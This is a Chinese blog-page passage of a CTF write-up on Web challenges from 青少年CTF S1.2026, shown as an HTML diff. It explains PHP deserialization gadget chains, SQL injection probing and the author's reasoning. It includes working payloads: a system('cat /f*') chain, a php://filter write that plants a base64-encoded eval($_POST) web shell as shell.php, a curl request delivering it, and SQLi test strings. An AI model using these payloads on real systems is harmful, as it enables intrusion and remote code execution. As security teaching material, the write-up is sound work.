@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="整理 QSNCTF Web 方向已完成题目的复盘记录，覆盖 PHP 反序列化、SQL 注入、Jinja2 SSTI、危险回调、preg_replace /e 与前端鉴权缺陷等典型考点。">
+    <meta name="author" content="hsjcha">
+    
+    <title>
+        
+            青少年CTF S1.2026 Web Writeup |
+        
+        HSJCHA LAB
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/logo.svg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"hsjcha-lab.xyz","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"HSJCHA LAB","author":"hsjcha","avatar":"/images/avatar.svg","logo":"/images/logo.svg","favicon":"/images/logo.svg"},"menu":{"home":"/","archives":"/archives"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/hsjcha","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":"admin@hsjcha-lab.xyz"}},"aside":{"enable":true,"position":"left","social":true},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"mac","copy":true,"collapse":true},"highlight_theme":"obsidian","copy":true,"style":"mac"},"toc":{"enable":false,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"style":{"dark_mode":{"enable":true,"default":"dark"}},"dark_mode":{"enable":true,"default":"dark"},"social_item":{"github":"https://github.com/hsjcha"},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               HSJCHA LAB
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        青少年CTF S1.2026 Web Writeup
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/avatar.svg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">hsjcha</span>
+                                
+                                    <span class="author-badge">Lv1</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2026-04-01 16:20:00</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Wed Apr 01 2026 15:05:29 GMT+0800">2026-04-01 15:05:29</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/CTF/">CTF</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PHP/">PHP</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Writeup/">Writeup</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/SSTI/">SSTI</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>2.9k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>12 分钟</span>
+            </span>
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p>这篇文章整理的是我在 <code>青少年CTF S1.2026</code> 里做出来的几道 <code>Web</code> 题。这篇文章会尽量把内容写成“为什么这样想、为什么这个 payload 能通”，而不只是把答案堆上来。</p>
+<h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p><code>PHP 反序列化</code> + <code>魔术方法利用</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// TIPS：FLAG在根目录下</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monitor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$reporter</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status = <span class="string">&quot;normal&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;reporter = <span class="keyword">new</span> <span class="title class_">Logger</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;status === <span class="string">&quot;danger&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;reporter-&gt;<span class="title function_ invoke__">alert</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">alert</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;System normal. No alert needed.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Screen</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$format</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">alert</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;format;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>(<span class="variable language_">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No flag here!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$input</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这题的入口很直接，就是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$input</span>);</span><br></pre></td></tr></table></figure>
+
+<p>最关键的是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Monitor</span>::<span class="title function_ invoke__">__destruct</span>()</span><br></pre></td></tr></table></figure>
+
+<p>对象销毁时会检查：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;status === <span class="string">&quot;danger&quot;</span>) &#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;reporter-&gt;<span class="title function_ invoke__">alert</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以利用条件只有两个：</p>
+<ul>
+<li>把私有属性 <code>$status</code> 改成 <code>&quot;danger&quot;</code></li>
+<li>把 <code>$reporter</code> 从 <code>Logger</code> 换成一个我们可控的对象</li>
+</ul>
+<p>接着看 <code>Screen::alert()</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;format;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$func</span>(<span class="variable language_">$this</span>-&gt;content);</span><br></pre></td></tr></table></figure>
+
+<p>这就相当于把 <code>$format</code> 当函数名，把 <code>$content</code> 当参数执行。如果我们构造成：</p>
+<ul>
+<li><code>$format = &quot;system&quot;</code></li>
+<li><code>$content = &quot;cat /f*&quot;</code></li>
+</ul>
+<p>那么最终效果就是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /f*&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>为什么要写 <code>cat /f*</code>, 因为题目对输入做了过滤：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$input</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monitor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$status</span> = <span class="string">&quot;danger&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$reporter</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;reporter = <span class="variable">$obj</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Screen</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;cat /f*&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$format</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Screen</span>();</span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> <span class="title class_">Monitor</span>(<span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$m</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这一题值得记住什么</p>
+<ul>
+<li>反序列化题先找 <code>__destruct()</code>、<code>__wakeup()</code>、<code>__toString()</code> 这类魔术方法</li>
+<li>关键字过滤不一定要硬刚，通配符和等价写法经常更实用</li>
+<li>真正的利用核心不是“有没有危险函数”，而是“可控属性能不能把调用链导到危险函数”</li>
+</ul>
+<h2 id="Serialization"><a href="#Serialization" class="headerlink" title="Serialization"></a>Serialization</h2><p><code>PHP 反序列化</code> + <code>__toString()</code> + <code>任意文件写入</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuditLog</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handler</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> <span class="title class_">SystemStatus</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileCache</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filePath</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$data</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filePath = <span class="variable">$path</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$security_header</span> = <span class="string">&#x27;&lt;?php exit(&quot;Access Denied: Protected Cache&quot;); ?&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$final_data</span> = <span class="variable">$security_header</span> . <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filePath, <span class="variable">$final_data</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Cache Saved.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SystemStatus</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;./system_config.php&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;./system_config.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;System logic normal.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$payload</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Invalid data stream.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这题最容易被误导的点，是去盯着 <code>system_config.php</code>。但真正危险的位置其实是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br></pre></td></tr></table></figure>
+
+<p>因为 <code>unserialize()</code> 出来的如果是对象，而对象类里实现了 <code>__toString()</code>，那么 <code>echo</code> 时会自动调用它。</p>
+<p>这里链路就是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>)</span><br><span class="line">-&gt; <span class="title class_">AuditLog</span>::<span class="title function_ invoke__">__toString</span>()</span><br><span class="line">-&gt; <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">process</span>()</span><br></pre></td></tr></table></figure>
+
+<p>默认 <code>handler</code> 是 <code>SystemStatus</code>，但如果我们把它替换成 <code>FileCache</code>，最后就会进入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filePath, <span class="variable">$final_data</span>);</span><br></pre></td></tr></table></figure>
+
+<p>难点不是“能不能写”，而是程序强制在前面拼了一段保护头：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>(<span class="string">&quot;Access Denied: Protected Cache&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果直接把木马写进 <code>shell.php</code>，访问文件时会先执行这句 <code>exit()</code>，后面的恶意内容根本到不了。</p>
+<p>所以这里要换思路，用 <code>php://filter</code> 让“写入过程”和“最终落盘结果”不是一回事。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuditLog</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handler</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileCache</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filePath</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$fc</span> = <span class="keyword">new</span> <span class="title class_">FileCache</span>();</span><br><span class="line"><span class="variable">$fc</span>-&gt;filePath = <span class="string">&quot;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&quot;</span>;</span><br><span class="line"><span class="variable">$fc</span>-&gt;content  = <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$log</span> = <span class="keyword">new</span> <span class="title class_">AuditLog</span>();</span><br><span class="line"><span class="variable">$log</span>-&gt;handler = <span class="variable">$fc</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发包时踩过的坑:</p>
+<p>请求发过去后页面显示 <code>Cache Saved.</code>，但访问 <code>shell.php</code> 却不成功。</p>
+<p>最后发现问题不在利用链，而在传输方式。序列化字符串里有引号、冒号等特殊字符，如果表单编码或请求工具处理得不对，payload 会被改坏。</p>
+<p>稳妥的方式是：</p>
+<ul>
+<li>用 <code>Burp Repeater</code> 发原始请求</li>
+<li>或者用 <code>curl --data-urlencode</code></li>
+</ul>
+<p>例如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://challenge.qsnctf.com:53020/ \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;data=O:8:&quot;AuditLog&quot;:1:&#123;s:7:&quot;handler&quot;;O:9:&quot;FileCache&quot;:2:&#123;s:8:&quot;filePath&quot;;s:77:&quot;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&quot;;s:7:&quot;content&quot;;s:36:&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==&quot;;&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qsnctf&#123;8a389bd435454311b3c3de31f2578721&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="silent-logger"><a href="#silent-logger" class="headerlink" title="silent_logger"></a>silent_logger</h2><p>这题是很标准的注入判断流程，题目本身不花，但很适合拿来练“别上来就乱爆”的习惯。</p>
+<p>先测最基础的真假条件：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 -- </span></span><br></pre></td></tr></table></figure>
+
+<p>发现回显明显变化，说明注入成立。接着测字段数：</p>
